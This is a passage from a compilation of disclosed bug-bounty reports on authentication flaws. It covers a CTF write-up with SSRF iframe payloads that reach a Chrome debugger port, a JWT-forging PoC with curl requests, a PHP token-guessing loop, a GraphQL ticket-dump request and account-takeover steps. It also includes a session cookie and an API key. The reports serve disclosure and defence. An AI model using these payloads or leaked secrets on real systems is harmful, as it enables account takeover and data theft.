I saw that ~300 iframes in the same document is possible without having a timeout from the converter. This allow to create a lot of iframes to localhost, with different ports, to see if it outputs something. Multiple ports have been found open, and notably : 

- 80
- 443
- 3000
- 9222
- 13398

The 9222 port responds with a "Inspectable web contents" message, which corresponds to the debugger API from Chrome, which is a pretty interesting target.

Here is an example payload that sets the payload in the name of the user 16 : 

``
POST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1
[...]
Cookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3xpA6zCiBFkPrghj_3RpXJ-fk3jcMmDceyjpTAg9aKhrZIVpplGapxcg2iA4769A4a4m5E3iCBvARCvjLtQGKYVrq-baEeZlym6Ztr-zvv97iGuv6lWkbyv4k8PpvKcQqcKZcpNLGHg_w-QKRNi0N.XiDmKA.o5lphYOx41pDSbeAm37D7wA9grg

name=<iframe src="http://localhost:9222"/>&user_id=16&_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7
```

The user 16 is now able to make a document conversion. The output document will contains an iframe with data from http://localhost:9222.

# Chrome debugger API opened

The Chrome debugger API is enabled and can be accessed through the SSRF from the previous step. There are both a Websocket API (complete) and a JSON API (limited) that allows to retrieve data from this interface.

By using the JSON api, hitting the */json/list* endpoint, we can see every tabs that are currently opened, with associated URLs and titles. Here is a sample of data returned : 

```
[ {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/06B5383E01A67809265501A45699022A",   "id": "06B5383E01A67809265501A45699022A",   "title": "My Docz Converter",   "type": "page",   "url":"http://localhost:3000/converter/de5be989b6ba5bf281074073611b12a2cef1fab3fb24f99decc6be773fce5927.png?user_name=Jobert%3Cscript%3Edocument.location.href%3D%27http%3A//localhost%3A9222/json%27%3C/script%3E",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/06B5383E01A67809265501A45699022A"}, {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/40B45AD7E01052E5E79BE278D1C6F03C",   "id": "40B45AD7E01052E5E79BE278D1C6F03C",   "title": "My Docz Converter",   "type": "page",   "url": "http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/40B45AD7E01052E5E79BE278D1C6F03C"}, {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/69206B536A6D44F4950C2BE822522BF8",   "id": "69206B536A6D44F4950C2BE822522BF8",   "title": "about:blank",   "type": "page",   "url": "about:blank",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/69206B536A6D44F4950C2BE822522BF8"}, {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/37FC54275A3B9966EE6307427568FF34",   "id": "37FC54275A3B9966EE6307427568FF34",   "title": "about:blank",   "type": "page",   "url": "about:blank",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/37FC54275A3B9966EE6307427568FF34"}, {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/D06A13E7032D841AD5B56B06F055B4B9",   "id": "D06A13E7032D841AD5B56B06F055B4B9",   "title": "about:blank",   "type": "page",   "url": "about:blank",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/D06A13E7032D841AD5B56B06F055B4B9"} ]
```

As we can see, there is a *http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf* tab that is opened. By retrieving the secret document name, and trying to access it as a normal document, we can see the secret document here : 

*https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf*

The flag is *h1ctf{y3s_1m_c0sm1c_n0w}*


This was a nice challenge, thank you for that!

Best regards,
Blaklis

## Impact

Attackers are able to access the very secret document from Jobert!

---

### [[h1-415 2020] finally](https://hackerone.com/reports/779910)

- **Report ID:** `779910`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** h1-ctf
- **Reporter:** @003random
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T21:30:09.663Z
- **CVE(s):** -

**Vulnerability Information:**

1. add { or } chars behind Joberts email, which leaks on the login page
2. register a new account using that email
3. sign out and use the recover feature with the just generated qr code. this will get you into Joberts account
3. head to /support and submit a blind XSS payload which extracts the document.location
4. submit the form on this feedback review page
5. change the user id to your own account you created at step 2
6. place an XSS payload in the user's name field and generate a pdf. payload: 
<iframe src="http://localhost:9222/json/list" style="width: 100%; height: 1000px"></iframe>
7. view the pdf. (chromium debugger port)
8. copy the id in the URL which contains "secret"
9. profit

thanks for reading this far!! I hope you like my writeup, and may I be the winner.
lmao, I'm kidding, I'm only submitting this because it took me like 40 hours to finish this CTF.
(from which a lot consisted of frustration and depression because of the 80% downtime or the core functions not working :( )

Not doing an actual write-up since I got some hints from 2 friends of mine, so I didn't 100% do this on my own.
may Bayo and Jllis be the winners.
BBAC represent :muscle:


Flag: https://h1-415.h1ctf.com/documents/1327fe21a19e8f7fefc83bbbaaace3ccb329eb9e4cd2df66ef6e0cf84dd7401e

## Impact

Big impact. Bounty pls

---

### [Account take over of 'light' starbuckscardb2b users](https://hackerone.com/reports/767829)

- **Report ID:** `767829`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Starbucks
- **Reporter:** @zude
- **Bounty:** - usd
- **Disclosed:** 2020-01-29T17:38:31.113Z
- **CVE(s):** -

**Vulnerability Information:**

This issue was found on https://www.starbuckscardb2b.com, this website belongs to starbucks and its is a critical vulnerability so I am reporting this.

```Issue:``` An attacker can takeover the account of the victim by creating a new account by using victim's (who is already registered) email address. 

Steps to reproduce are as follows:
1. Open https://www.starbuckscardb2b.com and go to create account.
2. for example user successfully created the account with ```abc@xyz.com``` and password ```12345678```
3. Now attacker will create the account with the email used in step 2  ```abc@xyz.com``` with different password.
4. After completion of step 3 the password for the  ```abc@xyz.com``` user will be set to the password used by attacker.
5. This will result in the account take over by attacker.

## Impact

An attacker can take over the control of any/all registered users.

**Summary (team):**

zude discovered that 'light' accounts on https://www.starbuckscardb2b.com could be taken over by registering a new account with the same email address. 'Light' accounts were defined as those that had been created but not used to add a payment method or complete a checkout.

@zude — thank you for reporting this vulnerability and confirming the resolution.

---

### [[express-laravel-passport] Improper Authentication](https://hackerone.com/reports/748214)

- **Report ID:** `748214`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @ermilov
- **Bounty:** - usd
- **Disclosed:** 2020-01-04T22:09:36.655Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report Improper Authentication in `express-laravel-passport`
It allows to forge user's identity

# Module

**module name:** express-laravel-passport
**version:** 1.1.2
**npm page:** `https://www.npmjs.com/package/express-laravel-passport`

## Module Description

You want a middleware support express get authorization from laravel-passport-structured database, this will help you.

## Module Stats

14 weekly downloads

# Vulnerability

## Vulnerability Description

`express-laravel-passport` is an authentication middleware which utilizes JWT tokens. The module defined to handle authentication but does not validate the JWT token sent by the user. Therefore it allows modifying payload within the token. This weakness provides an opportunity to forge the user's identity by changing the information inside the token's payload that is used to authenticate the client.

source code example:

https://github.com/EugeneNguyen/express-laravel-passport/blob/master/src/index.js#L13

```
const { jti } = jwt.decode(token);
```

`jti` variable retrieved from the token without any verification

## Steps To Reproduce:

* create directory for testing
```bash
mkdir poc
cd poc/
```

* install dependencies required for `express-laravel-passport` and test app to work

```bash
npm init
npm i express
npm i sequelize@4.32.7
npm i sqlite3
npm i express-laravel-passport
```

* create `index.js` with test application code

```javascript
const express = require('express')
const Sequelize = require('sequelize')
const passport = require('express-laravel-passport')

// create inmemory Sqlite DB for testing purposes
const sequelize = new Sequelize('database', 'username', 'password', {dialect: 'sqlite'})

// init express
const app = express()
const port = 3000

// create instance of `express-laravel-passport`
const passportMiddleware = passport(sequelize)

// create db Model that simulates structure required for `express-laravel-passport` to work properly
const Model = sequelize.define('oauth_access_tokens', {
  user_id: Sequelize.INTEGER
}, {
  timestamps: false
});

// create DB
sequelize.sync()
  // put some test data to DB
  .then(() => Model.bulkCreate([{user_id:1},{user_id:2},{user_id:3}]))
  // run the express app with `express-laravel-passport` as middleware
  .then(() => {
    app.get('/', passportMiddleware, (req, res) => {
      const user_id = req.user_id;
      if (user_id) {
        res.send(`logged in as: ${user_id}\n`)
      } else {
        res.send('not logged in\n')
      }
    })

    app.listen(port, () => console.log(`Example app listening on port ${port}!`))
  })
```

* run it

```bash
node index.js
```

the app runs on `localhost:3000`, so now you can send requests to this address in order to test its behaviour

* send crafted request with JWT token in `authorization` header
token is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc`

which represents this payload: `{"jti": 1}` and was simply created at www.jwt.io

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

`logged in as: 1` is logged to the console as a result

* send another crafted request with JWT token in `authorization` header
token is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc`

which represents this payload: `{"jti": 2}` ***BUT*** keeps the signature from previous token (n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc), therefore this token is not valid by any means

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

`logged in as: 2` is logged to the console as a result, which illustrates the fact that it is possible to forge JWT tokens and fake id of the user.


While testing you can put a breakpoint in poc/node_modules/express-laravel-passport/src/index.js file on line 13, to make sure that it is the `express-laravel-passport` responsible for handling token verification

## Patch

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Linux Mint current
- NODEJS VERSION: 12.7.0
- NPM VERSION: 6.10.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

This weakness provides opportunity to forge user's identity by changing information inside token's payload that is used to verify the client.

**Summary (researcher):**

Research based on this and other JWT related H1 reports:
https://r2c.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/

---

### [Thailand – a small number of alarm system portals accessible with the default credentials](https://hackerone.com/reports/406486)

- **Report ID:** `406486`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Starbucks
- **Reporter:** @radosec
- **Bounty:** - usd
- **Disclosed:** 2019-11-18T22:25:01.576Z
- **CVE(s):** -

**Summary (team):**

radoooz discovered that a small number of AAP IP Module alarm system portals in Thailand were accessible, utilizing their default credentials.

@radoooz — thank you for reporting this vulnerability and confirming the resolution.

---

### [Broken Authentication - Security token gets captured via man in the middle attack](https://hackerone.com/reports/206650)

- **Report ID:** `206650`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Automattic
- **Reporter:** @saurabhb
- **Bounty:** - usd
- **Disclosed:** 2019-06-22T14:15:50.376Z
- **CVE(s):** -

**Vulnerability Information:**

**Product / URL**

`http://en.instagram-brand.com/register/reset/<the security token here>?email=<email address here>`


**Description and Impact**

The password reset links issues by Instagram Brand gets delivered to users inbox with a http scheme and NOT https scheme.

This causes an attacker stealing those links and performing mass account takeovers and security compromises.

The link that gets delivered in inbox is:
`http://mandrillapp.com/track/click/30956340/instagram-brand.com?p=<the very long security token here>`

On requesting the above link in browser, it sends back the password reset token in clear text: `http://en.instagram-brand.com/register/reset/<the security token here>?email=<the email of user here>`

**Solution:**
This issues has a very easy solution. I have myself performed this and it worked !!.
Whenever the code responsible for sending password reset link makes those links, just add https as scheme instead of http. And you will observe that now all the accounts are safe and data cannot be stolen.


**Reproduction Instructions / Proof of Concept**

1. Request for you password reset link.
2. Go to inbox.
3. Right click that link and paste it on notepad and observe the scheme.
4. You can also start Wireshark to capture the traffic and observe that security token can be compromised.

I have attached the screenshot of Wireshark as a proof of concept. F161119

---

### [Authentication Bypass - Chaining two vulnerabilities leads to account takeover at en.instagram-brand.com](https://hackerone.com/reports/209008)

- **Report ID:** `209008`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Automattic
- **Reporter:** @saurabhb
- **Bounty:** - usd
- **Disclosed:** 2019-06-22T14:12:38.392Z
- **CVE(s):** -

**Vulnerability Information:**

**Product / URL**
https://en.instagram-brand.com/wp-json/brc/v1/login/

**Description and Impact**
An attacker can perform account takeover by leveraging following two vulnerabilities:

Auth Bypass = Username Enumeration + Login Brute Force



A. Username Enumeration:
-------------------------------

For the site https://en.instagram-brand.com/, it is made sure that a malicious user cannot enumerate usernames of the users by implementing CAPTCHAs at Sign Up (https://en.instagram-brand.com/register/signup) and Forgot Password (https://en.instagram-brand.com/register/signin) pages.
This is made the site secure.
But I have found a way to bypass this protection. The endpoint: https://en.instagram-brand.com/wp-json/brc/v1/resend-verify has absolutely no rate limiting, thus a malicious user can take its advantage to enumerate usernames.

**Another thing of concern is that, if a valid username is found, then the Instagram site sends an account verification link to that email. Even if the account is previously verified !! And if those victims try to login, then they can't. The site asks to first verify their account by clicking on the account activation links !!**

An attacker can harvest the usernames and abuse this functionality to bother the victims.

**Following is the analysis:**
1) The endpoint to which the actual request goes - https://en.instagram-brand.com/wp-json/brc/v1/resend-verify
2) The total number of requests/attempts you were able to make - 1001 (you can do it infinite)
3) The time in which you made those requests/attempts - 10 minutes
4) Some demonstration that you weren't actually just silently locked out -Refer the attached exploit.

**Exploit Developed:**
1. Save the files email.txt and InstagramBrandEnumerationExploit.rb in a folder.
2. Run the exploit like this: ruby InstagramBrandEnumerationExploit.rb
3. Observe in the console that the right emails are disclosed within seconds.


**Reproduction Instructions / Proof of Concept**
1. Sign Up using any email address.
2. Attach a local intercepting proxy.
3. After signing up, a resend email button will appear.
4. Click on it and intercept the request.
5. For the parameter, 'email' in the request body, put your payloads i.e. email addresses to need to be enumerated.
6. Send the request.
7. Observe the response. It is verbose and states clearly if the user exists or not.
8. Now try to login using any of the victim's email.
9. Observe that the web app does not let you login.

**The HTTP Request is:**

`POST /wp-json/brc/v1/resend-verify HTTP/1.1
Host: en.instagram-brand.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-WP-Nonce: 30436dbdab
Content-Type: application/x-www-form-urlencoded
Referer: https://en.instagram-brand.com/register/signup
Content-Length: 29
Cookie: pll_language=en; _ga=GA1.2.2112289023.1486871994; _gat=1
Connection: keep-alive`

`email=<your email here>`




B. Login Brute Force
-----------------------

The endpoint https://en.instagram-brand.com/wp-json/brc/v1/login/ does not have any rate limiting. This still allows an attacker to make the following number of guesses from one single system single threaded : 100 per min, 6,000 per hour, 1,44,000 per day or 43,20,000/month. No additional protection mechanism such as Captcha (pre-auth) or account lockout requiring additional email/phone verification (pre- or post-auth) were identified at any time. I could make 1020 attempts in 10 minutes.

**Solution:**
Implement a Captcha after a reasonable number of failed login attempts against one account at the application-layer. The Captcha should not only be shown to offending IP addresses, but to anyone who attempts to login to the account under attack. Another option is to enable an account lockout policy which effectively locks down an account that has been attacked (e.g. after 20 failed consecutive logins) and requires out-of-band validation by the real account owner (e.g. email, mobile) before becoming accessible again.


**Reproduction Instructions / Proof of Concept**
I have developed an exploit in Ruby to demonstrate this attack. 
Its usage:
1. Save the InstagramBrandLoginBruteForce.rb in any folder.
2. Have a long list of passwords in passlist.txt file and keep it in the same folder.
3. On line number 7, enter the name of the victim's email who you want to target. This can also come from username enumeration list fetched from the exploit InstagramBrandEnumerationExploit.rb
4. Using cmd, navigate to that folder and run it like this: ruby InstagramBrandLoginBruteForce.rb
5. Observe the results.


**Additional Note:**
I have used single threading for these attacks, but these can be more powerful if multi threading is used.

---

### [H1514 [*.(my)shopify.com] - Viewing Password Protected Content](https://hackerone.com/reports/421859)

- **Report ID:** `421859`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Shopify
- **Reporter:** @corb3nik
- **Bounty:** 3000 usd
- **Disclosed:** 2019-05-22T18:30:53.737Z
- **CVE(s):** -

**Vulnerability Information:**

Hi guys!

When administering a shop, the owner has the ability to preview his shop with various themes. When previewing, a unique link is generated, which the owner can share with various people without any authentication.

The generation of that unique link does not require authentication, which means any user can generate a preview link and view the contents of the shop.

Previewing isn't affected by password protection, so a user who has managed to obtain a preview link can successfully view the shop's content without knowing the password.

## Steps to Reproduce

1. Visit the following shop : https://mycorb3nikshop.myshopify.com.
2. Notice that it is protected by a password.
3. Visit https://mycorb3nikshop.myshopify.com/preview_bar and view the page's source code.
4. Search for a shopifypreview.com URL. This is the preview link generated for `mycorb3nikshop`.
5. Visit the preview URL.

You should now see the contents of the shop. Note that we've successfully viewed the content without any authentication.

{F358126}

## Impact

The impact of this bug is pretty straightforward. Because of the `/preview_bar`, the password protection is rendered useless.

Depending on the confidentiality of a shop's content, I would set the severity to either high or medium here :)

**Summary (team):**

[@corb3nik](/corb3nik) discovered a vulnerability on the theme preview feature that 
could have allowed a malicious user to bypass the storefront password protection for 
any store by accessing the `/preview_bar` endpoint and fetching the preview domain of 
a store; giving them access to any information displayed in the storefront area.

---

### [Authentication Bypass by abusing Insecure crypto tokens in /lib/OA/Dal/PasswordRecovery.php:](https://hackerone.com/reports/576504)

- **Report ID:** `576504`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Revive Adserver
- **Reporter:** @paulos__
- **Bounty:** - usd
- **Disclosed:** 2019-05-21T15:15:41.490Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

This is a fun bug I came across while doing a pentest for a client, after going through Revive Advserver's code for a few hours, I found this authentication bypass. This vulnerability seem to affect all versions, including the latest one, I was sent by one of your developers to report it here.

It goes like this:

In */lib/OA/Dal/PasswordRecovery.php*:

```php
50: function generateRecoveryId($userId)
{
$doPwdRecovery = OA_Dal::factoryDO('password_recovery');

    // Make sure that recoveryId is unique in password_recovery table
    do {
        $recoveryId = strtoupper(md5(uniqid('', true)));
        $recoveryId = substr(chunk_split($recoveryId, 8, '-'), -23, 22);
        $doPwdRecovery->recovery_id = $recoveryId;
        ....
 .....
....
```

That function is used to generate the password reset token used to create new password for admins. The token generated for changing password is insecure because it soley just relies on uniqid() which, according to PHP manual states:

*"This function does not create random nor unpredictable string. This function must not be used for security purposes. Use cryptographically secure random function/generator and cryptographically secure hash functions to create unpredictable secure ID."*

The reason being that the function does not generate cryptographically secure tokens, in fact without being passed any additional parameters the return value is little different from *microtime()*. If you need to generate cryptographically secure tokens use *openssl_random_pseudo_bytes()*

*uniqid()* is worse than the manual makes it out to be. An example return value is `58fc30c53db63` . Already, this is only <7 bytes of entropy. But it becomes worse, because without the more_entropy flag set, PHP only uses the current time to generate the return value, PHP code says:

```C
sec = (int) tv.tv_sec;
usec = (int) (tv.tv_usec % 0x100000);
if (more_entropy) {
uniqid = strpprintf(0, "%s%08x%05x%.8F", prefix, sec, usec, php_combined_lcg() * 10);
} else {
uniqid = strpprintf(0, "%s%08x%05x", prefix, sec, usec);
}
```

The first four bytes are the current UNIX timestamp, and the last 20 bits are derived from the current time in microseconds.

This gives a bit less than 2²⁰, or one million, possible results per given second. If you are able to predict when a new session key is generated for a user, you can guess their key with a decent number of requests, depending on how accurate your guess is. On a popular forum, you may not even need to target a specific user, as the number of users logging in at one time may be large enough.

And lucky for us, we can easily predict what Revive Adserver uses:

Ideally an attacker will look up the host IP of their target, locate the server's geoip and set their timezone similar to the server's timezone to make a more accurate prediction.

### Making it more practical

When looking more closely I noticed, most servers that host Revive respond with the following headers:
```
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 09 May 2019 21:26:20 GMT
Content-Type: application/x-javascript
Connection: close
Vary: Accept-Encoding
X-Cacheable: NO:Not Cacheable
Age: 0
X-Cache: MISS
X-Frame-Options: SAMEORIGIN
Content-Length: ...
```

Do you see it? It says *Date: Thu, 09 May 2019 21:26:20 GMT* -- so we can easily know what timezone the server syncs and uses (in this case GMT+0 as timezone) , all an attacker have to do is change their timezone to GMT, request a password reset token simultaneously as they they generate uniqid() from their side as well. All an attacker needs is the email address of the account they reset (which can be enumurated in numerous ways, including by abusing *admin/password-recovery.php* by sending some email addresses until it says *Email Password Reset sent*)


A PoC one would use can look like the following (except weaponized to request a password and generate the tokens simultaneously):

```php
for($i=0;$i<=10000;$i++){

     $recoveryId = strtoupper(md5(uniqid('', true)));
     $recoveryId = substr(chunk_split($recoveryId, 8, '-'), -23, 22);

     print $recoveryId."</br>";

}
```

This generates 10,000 tokens we can try as a token to login as the admin by automating this with process with Burp Intruder. 

You get the idea! :)

### Suggested Fix

Relaying on more cryptographically secure functions like *openssl_random_pseudo_bytes()* is better for such sensitive tokens.

## Impact

Authentication Bypass


Thanks,

---

### [Chained Bugs to Leak Victim's Uber's FB Oauth Token](https://hackerone.com/reports/202781)

- **Report ID:** `202781`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Uber
- **Reporter:** @ngalog
- **Bounty:** - usd
- **Disclosed:** 2019-01-25T17:56:43.040Z
- **CVE(s):** -

**Summary (team):**

The Facebook OAuth application was misconfigured to allow any URL that followed the `https://auth.uber.com/login?*` format to be provided as a `redirect_uri`. By taking advantage of this, @ngalog was able to discover that the `next_url` parameter could be added to the `redirect_uri` allowing it to be chained further. Next, @ngalog found that the `https://login.uber.com/logout` endpoint would redirect based on the Referer header, making it possible to chain together another redirect. By piecing this together, @ngalog was able to provide us with an awesome single-URL PoC which would:

1. Prompt OAuth authorization on `facebook.com`
2. Redirect to `https://auth.uber.com/login?next_url=https://login.uber.com/logout` from Facebook
3. Redirect to `https://login.uber.com/logout` from `auth.uber.com`
4. Redirect to attacker site from Referer header and return the token

When combined, this would have allowed for a full account takeover and was a very creative and cool bug.

Nice work, @ngalog!

---

### [Open Redirect on central.uber.com allows for account takeover](https://hackerone.com/reports/206591)

- **Report ID:** `206591`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Uber
- **Reporter:** @ngalog
- **Bounty:** - usd
- **Disclosed:** 2019-01-25T17:41:45.736Z
- **CVE(s):** -

**Summary (team):**

An error in our OAuth2 flow for `central.uber.com` allowed an attacker to leverage an open redirect that allowed for a full account takeover. When logging into `central.uber.com`, the `state` parameter for login.uber.com contained a redirect location instead of a CSRF token. As a result, an attacker could modify the state parameter to have a poisoned `central.uber.com` path which would redirect to a custom domain after login and allow them to steal an account OAuth access token.

Thanks, @ngalog!

---

### [Redirect on authorization allows account compromise](https://hackerone.com/reports/384289)

- **Report ID:** `384289`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** GSA Bounty
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2018-11-06T20:53:24.944Z
- **CVE(s):** -

**Summary (team):**

Login.gov had a bug in validating the redirect_uri in the `/openid_connect/authorize` endpoint, which allowed specially crafted subdomains to be incorrectly validated when they began with a valid hostname. For example, a `redirect_uri` with a hostname of `agency.gov.example.com` would validate a URL as if it were presented as `agency.gov`.

This enabled an attacker to compromise user sessions on sites that integrated with login.gov. No user interaction was required other than the user being redirected to a URL.

Login.gov immediately patched this bug by making validation of the `redirect_uri` significantly stricter by enforcing an exact match of the hostname. Shortly after, Login.gov worked with agency partners to identify every full URL that agency service providers (SPs) would need to register, and then implemented exact matching for the entire `redirect_uri` (including the URL path).

**Summary (researcher):**

An error in parsing redirect urls during the authorization flow allowed an attacker to compromise a user's Login.gov token by redirecting users to a malicious site. Props to the TTS team for quickly issuing a patch after the report!

Ineligible for bounty due to government employment.

---

### [Unauthorized access to a system used for CI/CD processes](https://hackerone.com/reports/410475)

- **Report ID:** `410475`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Starbucks
- **Reporter:** @k3mlol
- **Bounty:** - usd
- **Disclosed:** 2018-11-01T21:55:00.784Z
- **CVE(s):** -

**Summary (team):**

@k3m reported a vulnerability allowing unauthorized access to a system used for CI/CD processes.  Our teams quickly restricted access and fixed the vulnerability. Thank you @k3m for a detailed report.

---

### [Unauthenticated access to Zendesk tickets through athena-flex-production.shopifycloud.com Okta bypass](https://hackerone.com/reports/397130)

- **Report ID:** `397130`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Shopify
- **Reporter:** @rijalrojan
- **Bounty:** - usd
- **Disclosed:** 2018-09-19T16:15:49.202Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary**

athena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information. 

**Description**

When you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do `view-source:athena-flex-production.shopifycloud.com` in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website: 

https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js

When you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to. 

For my test I sent: 

```
{"query": "query getRecentTicketsQuery($domain: String) {\n    shop(myshopifyDomain: $domain) {\n      zendesk {\n        tickets(last: 5) {\n          edges {\n            node {\n              id\n               requester {\n                name\n              }\n              subject\n              description\n              }\n          }\n        }\n      }\n    }\n  }\n","variables":{"domain":"ok.myshopify.com"}}
```

What this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data. 

I don't want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact support@hackerone.com later if you wish to disclose the report. 


**Reproduction**
1. Send the following curl request: 

```
curl -i -s -k  -X $'POST' \
    -H $'Host: athena-flex-production.shopifycloud.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 422' \
    --data-binary $'{\"query\": \"query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}' \
    $'https://athena-flex-production.shopifycloud.com/graphql'
```

**More information**

There is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure: 

```
R = n.n(O)()({
 apiKey: "5c0246635b3c77189888c0b10d3427ac",
 notifyReleaseStages: ["production"],
 releaseStage: "production" 
}),
```

## Impact

1. Get ticket description means dumping any detail you want. 
2. Creating zendesk ticket in behalf of other agents. 
3. Changing state of other tickets. 

**I will post list of all functions that is possible in this graphql.**

**Summary (team):**

@rijalrojan discovered an application and endpoint under `athena-flex-production.shopifycloud.com `that exposed metadata and contents of our Zendesk tickets. Within a couple hours, we had put it behind an OAuth portal to mitigate the issue. After an internal investigation revealed no evidence of malicious access to the data, we rewarded him with the highest bounty available under our non-core authentication bypass category ($5,000). We did this despite the app being out of scope because of the severity of the information disclosure. As always, out-of-scope rewards are at our sole discretion.

---

### [Spring security configuration allows agent sessions to be hijacked](https://hackerone.com/reports/241244)

- **Report ID:** `241244`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** GoCD
- **Reporter:** @4cad
- **Bounty:** - usd
- **Disclosed:** 2018-07-31T19:35:11.411Z
- **CVE(s):** -

**Vulnerability Information:**

Summary
=======
If agents have successfully logged in, then unauthenticated requests to /go/agent-websocket or /go/remoting/* will randomly succeed sometimes.

Description
========

The deprecated X509ProcessingFilter apparently does not work without a HttpSessionContextIntegrationFilter earlier on the chain. After a successful authentication it sets a thread-local security context that never gets cleared - meaning that future requests on /go/remoting or /go/agent-websocket will successfully authenticate if they randomly happen to be processed by one of the threads which has a valid security context.

Steps to Reproduce
=======
1) Start up a server.
2) Run the following command a bunch of times. It should always return a 403 Forbidden

 "curl http://localhost:8153/go/remoting/api/admin/config.xml | grep -B 2 Error"

3) Start up an agent, and wait about two minutes
4) Repeat the command from step 2. It should occasionally return a 500 Server Error. This happens when the request was successfully authenticated, and then fails in the GoCD code that is handling the request.

If the server has any artifacts, the URL from step (2) can be changed to a path to that URL. In this case it will sometimes return 403 Forbidden, and sometimes return the artifact itself. 

Risk
========

This allows an attacker without any credentials to read all artifacts or even upload artifacts (combined with #240198 they could use this to execute a stored XSS). While preparing this ticket, I was able to successfully upload a stored XSS file without any credentials by submitting a bunch of POST requests to http://localhost:8153/go/remoting/files/up42/1/up42_stage/1/up42_job/attack_unauthenticated.html

